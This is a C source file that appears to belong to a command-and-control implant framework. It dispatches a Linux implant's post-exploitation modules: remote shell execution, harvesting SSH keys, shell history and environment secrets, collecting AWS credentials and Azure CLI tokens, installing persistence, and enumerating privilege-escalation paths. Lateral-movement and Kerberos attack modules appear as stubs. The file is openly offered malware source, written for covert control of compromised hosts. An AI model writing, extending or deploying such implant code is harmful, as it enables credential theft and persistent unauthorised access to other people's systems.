/*
 * Linux C implant modules: shell + native creds/persist/privesc-enum.
 * AD / lateral / Windows post-ex modules hard-fail with explicit error bytes.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "ark/linux_cloud.h"
#include "ark/linux_postex.h"
#include "ark/modules.h"
#include "ark/pb_modules.h"
#include "ark/task_handlers.h"

int ark_mod_shell(const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len) {
    return ark_task_shell_execute(config, config_len, out, out_len);
}

/* Return 0; put human-readable reason in *out for executor to surface. */
static int fail_named(const char *name, uint8_t **o, size_t *ol) {
    char buf[160];
    int n = snprintf(buf, sizeof(buf), "not supported on linux c implant: %s", name ? name : "?");
    if (n < 0) n = 0;
    if ((size_t)n >= sizeof(buf)) n = (int)sizeof(buf) - 1;
    if (!o || !ol) return 0;
    *o = (uint8_t *)malloc((size_t)n + 1);
    if (!*o) {
        *ol = 0;
        return 0;
    }
    memcpy(*o, buf, (size_t)n + 1);
    *ol = (size_t)n;
    return 0;
}

int ark_mod_creds_dump(const uint8_t *c, size_t n, uint8_t **o, size_t *ol) {
    ark_cred_dump_config cfg;
    if (!ark_pb_decode_cred_dump_config(c, n, &cfg))
        return fail_named("creds_dump decode", o, ol);
    ark_credential creds[ARK_LINUX_CRED_MAX];
    size_t count = 0;
    if (!ark_linux_creds_collect(cfg.method, ark_linux_home(), creds, ARK_LINUX_CRED_MAX, &count))
        return fail_named("creds_dump method (use ssh_keys|history|env|files)", o, ol);
    return ark_pb_encode_cred_dump_result(cfg.method, creds, count, o, ol);
}

int ark_mod_cloud(const uint8_t *c, size_t n, uint8_t **o, size_t *ol) {
    ark_cloud_harvest_config cfg;
    if (!ark_pb_decode_cloud_harvest_config(c, n, &cfg))
        return fail_named("cloud decode", o, ol);
    const char *provider = cfg.provider[0] ? cfg.provider : "all";
    const char *method = cfg.method[0] ? cfg.method : "all";
    if (strcmp(method, "entra_token") == 0 || strcmp(method, "adconnect") == 0)
        return fail_named("entra_token is Windows-only (PRT/WAM)", o, ol);

    ark_cloud_credential creds[ARK_CLOUD_CRED_MAX];
    ark_cloud_token toks[ARK_CLOUD_TOKEN_MAX];
    size_t cn = 0, tn = 0;
    memset(creds, 0, sizeof(creds));
    memset(toks, 0, sizeof(toks));
    const char *home = ark_linux_home();

    int want_aws = (strcmp(provider, "aws") == 0 || strcmp(provider, "all") == 0);
    int want_az = (strcmp(provider, "azure") == 0 || strcmp(provider, "all") == 0);
    int harv = (strcmp(method, "all") == 0 || strcmp(method, "env") == 0 ||
        strcmp(method, "env_vars") == 0 || strcmp(method, "creds") == 0 ||
        strcmp(method, "cli") == 0 || strcmp(method, "imds") == 0 ||
        strcmp(method, "ecs") == 0);

    if (want_aws && harv) {
        if (strcmp(method, "all") == 0 || strcmp(method, "env") == 0 || strcmp(method, "env_vars") == 0)
            ark_cloud_harvest_aws_env(creds, &cn, ARK_CLOUD_CRED_MAX);
        if (strcmp(method, "all") == 0 || strcmp(method, "creds") == 0 || strcmp(method, "cli") == 0)
            ark_cloud_harvest_aws_files(home, creds, &cn, ARK_CLOUD_CRED_MAX);
        /* imds/ecs: live only; no network in host tests */
    }
    if (want_az && harv) {
        if (strcmp(method, "all") == 0 || strcmp(method, "cli") == 0)
            ark_cloud_harvest_azure_cli(home, toks, &tn, ARK_CLOUD_TOKEN_MAX);
    }
    if (!harv && strcmp(method, "sts-caller") != 0 && strcmp(method, "me") != 0 &&
        strncmp(method, "s3-list", 7) != 0 && strncmp(method, "sqs-", 4) != 0)
        return fail_named("cloud method", o, ol);

    return ark_pb_encode_cloud_harvest_result(provider, method, toks, tn, creds, cn, NULL, NULL, o, ol);
}

int ark_mod_persist(const uint8_t *c, size_t n, uint8_t **o, size_t *ol) {
    ark_persist_config cfg;
    if (!ark_pb_decode_persist_config(c, n, &cfg))
        return fail_named("persist decode", o, ol);
    char details[1024];
    int ok = ark_linux_persist_apply(&cfg, ark_linux_home(), details, sizeof(details));
    int enc = ark_pb_encode_persist_result(ok, cfg.method, details, o, ol);
    ark_pb_free_persist_config(&cfg);
    return enc;
}

int ark_mod_privesc(const uint8_t *c, size_t n, uint8_t **o, size_t *ol) {
    ark_privesc_config cfg;
    if (!ark_pb_decode_privesc_config(c, n, &cfg))
        return fail_named("privesc decode", o, ol);
    if (strcmp(cfg.method, "enum") != 0)
        return fail_named("privesc method (use enum)", o, ol);
    char dump[4096];
    if (!ark_linux_privesc_enum(dump, sizeof(dump)))
        return fail_named("privesc enum", o, ol);
    return ark_pb_encode_privesc_result(1, "enum", dump, 0, o, ol);
}
int ark_mod_lateral_move(const uint8_t *c, size_t n, uint8_t **o, size_t *ol) {
    (void)c; (void)n;
    return fail_named("lateral_move", o, ol);
}
int ark_mod_ldap_enum(const uint8_t *c, size_t n, uint8_t **o, size_t *ol) {
    (void)c; (void)n;
    return fail_named("ldap_enum", o, ol);
}
int ark_mod_kerberoast(const uint8_t *c, size_t n, uint8_t **o, size_t *ol) {
    (void)c; (void)n;
    return fail_named("kerberoast", o, ol);
}
int ark_mod_asreproast(const uint8_t *c, size_t n, uint8_t **o, size_t *ol) {
    (void)c; (void)n;
    return fail_named("asreproast", o, ol);
}

static const struct {
    const char       *name;
    ark_module_fn  fn;
} g_modules[] = {
    { "shell", ark_mod_shell },
    { "creds_dump", ark_mod_creds_dump },
    { "persist", ark_mod_persist },
    { "privesc", ark_mod_privesc },
    { "cloud", ark_mod_cloud },
    { "lateral_move", ark_mod_lateral_move },
    { "ldap_enum", ark_mod_ldap_enum },
    { "kerberoast", ark_mod_kerberoast },
    { "asreproast", ark_mod_asreproast },
};

int ark_module_execute(const char *name, const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len) {
    if (!name || !name[0]) return fail_named("unknown", out, out_len);
    for (size_t i = 0; i < sizeof(g_modules) / sizeof(g_modules[0]); i++) {
        if (strcmp(g_modules[i].name, name) == 0)
            return g_modules[i].fn(config, config_len, out, out_len);
    }
    return fail_named(name, out, out_len);
}
